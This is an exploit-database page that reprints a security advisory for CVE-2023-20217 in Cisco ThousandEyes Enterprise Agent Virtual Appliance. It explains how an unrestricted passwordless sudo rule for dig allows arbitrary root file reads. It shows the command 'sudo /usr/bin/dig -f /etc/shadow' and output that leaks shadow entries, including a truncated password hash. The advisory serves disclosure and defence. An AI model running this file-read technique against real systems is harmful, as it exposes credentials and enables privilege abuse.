---
title: Cisco ThousandEyes Enterprise Agent Virtual Appliance Arbitrary File Read Vulnerability exploit
url: https://sploitus.com/exploit?id=1337DAY-ID-38978&utm_source=rss&utm_medium=rss
source: Sploitus.com Exploits RSS Feed
date: 2023-08-21
fetch_date: 2025-10-04T11:58:50.001537
---

# Cisco ThousandEyes Enterprise Agent Virtual Appliance Arbitrary File Read Vulnerability exploit

[x]
Dark Mode

[##### SPLOITUS](/)

# Exploit for Cisco ThousandEyes Enterprise Agent Virtual Appliance Arbitrary File Read Vulnerability CVE-2023-20217

2023-08-20 | CVSS 5.5

Copy
Download
Source
[Share](#share-url)

```
## https://sploitus.com/exploit?id=1337DAY-ID-38978
Title: Cisco ThousandEyes Enterprise Agent Virtual Appliance Arbitrary File Read via sudo dig
Advisory ID: KL-001-2023-001
Publication Date: 2023.08.17
Publication URL: https://korelogic.com/Resources/Advisories/KL-001-2023-001.txt

1. Vulnerability Details

      Affected Vendor: ThousandEyes
      Affected Product: ThousandEyes Enterprise Agent Virtual Appliance
      Affected Version: thousandeyes-va-64-18.04 0.218
      Platform: Linux / Ubuntu 18.04
      CWE Classification: CWE-1395: Dependency on Vulnerable
                          Third-Party Component,
                          CWE-1220: Insufficient Granularity of
                          Access Control
      CVE ID: CVE-2023-20217

2. Vulnerability Description

      An insecure sudo configuration permits a low-privilege user
      to read root-only files via the 'dig' command without a
      password.

3. Technical Description

      The ThousandEyes Virtual Appliance is distributed with a
      restrictive set of commands that can be executed via sudo,
      without having to provide the password for the 'thousandeyes'
      account. However, the ability to execute dig via sudo,
      allows for reading of arbitrary files using dig's "batch"
      mode. This mode allows a user to specify a file of requests,
      one per line. The dig command will read the file with elevated
      privileges and display the resulting queries (i.e. file
      contents) back to the user.

        thousandeyes@thousandeyes-va:~$ id
        uid=1000(thousandeyes) gid=1000(thousandeyes)
groups=1000(thousandeyes),4(adm),24(cdrom),27(sudo),30(dip),46(plugdev),108(lpadmin),109(sambashare)
        thousandeyes@thousandeyes-va:~$ sudo -l
        Matching Defaults entries for thousandeyes on thousandeyes-va:
            env_reset, mail_badpass,
secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

        User thousandeyes may run the following commands on thousandeyes-va:
            (ALL : ALL) ALL
            (ALL) NOPASSWD: /bin/systemctl start te-va, /bin/systemctl stop te-va, /bin/systemctl restart te-va,
/bin/systemctl status te-va, /bin/systemctl start te-agent, /bin/systemctl stop
                te-agent, /bin/systemctl restart te-agent, /bin/systemctl status te-agent, /bin/systemctl start
te-browserbot, /bin/systemctl stop te-browserbot, /bin/systemctl restart
                te-browserbot, /bin/systemctl status te-browserbot, /sbin/reboot, sudoedit /etc/hosts, /usr/bin/dig,
/usr/bin/lsof, /usr/bin/apt-get update, /usr/bin/apt-get install te-agent,
                /usr/bin/apt-get install te-browserbot, /usr/bin/apt-get install te-va, /usr/bin/apt-get install te-pa,
/usr/bin/apt-get install te-va-unlock, /usr/bin/apt-get install
                te-intl-fonts, /usr/bin/apt-get install te-agent-utils, /usr/bin/apt-get install ntpdate,
/usr/bin/apt-cache, /usr/bin/te-*, /usr/local/bin/te-*, /usr/local/sbin/te-*
            (root) NOPASSWD: /usr/sbin/ntpdate, /usr/sbin/traceroute, /usr/sbin/tcpdump

      Here we see that dig is available as root with no password,
      and no restrictions on the arguments it can be passed.

        thousandeyes@thousandeyes-va:~$ sudo /usr/bin/dig -f /etc/shadow

        ; <<>> DiG 9.11.3-1ubuntu1.17-Ubuntu <<>> root:!:19145:0:99999:7:::
        ;; global options: +cmd
        ;; Got answer:
        ;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 40036
        ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

        ;; OPT PSEUDOSECTION:
        ; EDNS: version: 0, flags:; udp: 65494
        ;; QUESTION SECTION:
        ;root:!:19145:0:99999:7:::.    IN    A

        ;; Query time: 0 msec
        ;; SERVER: 127.0.0.53#53(127.0.0.53)
        ;; WHEN: Fri Mar 31 08:00:38 UTC 2023
        ;; MSG SIZE  rcvd: 54

        ; <<>> DiG 9.11.3-1ubuntu1.17-Ubuntu <<>> daemon:!*:18885:0:99999:7:::
        ;; Got answer:
        ;; ->>HEADER<<- opcode: QUERY, status: SERVFAIL, id: 32743
        ;; flags: qr rd ra; QUERY: 1, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 1

        ;; OPT PSEUDOSECTION:
        ; EDNS: version: 0, flags:; udp: 65494
        ;; QUESTION SECTION:
        ;daemon:!*:18885:0:99999:7:::.    IN    A
        ...
;thousandeyes:$6$qvB7Zfsh1fFCuBM9$l3X3Gj/7v.IY54N5YMFj5hpd.Fb...
        ...

4. Mitigation and Remediation Recommendation

      The vendor has released a version which remediates the described
      vulnerability. Release notes are available at:

https://sec.cloudapps.cisco.com/security/center/content/CiscoSecurityAdvisory/cisco-sa-te-va-priv-esc-PUdgrx8E
```

Share

Copy

![](https://mc.yandex.ru/watch/54912310)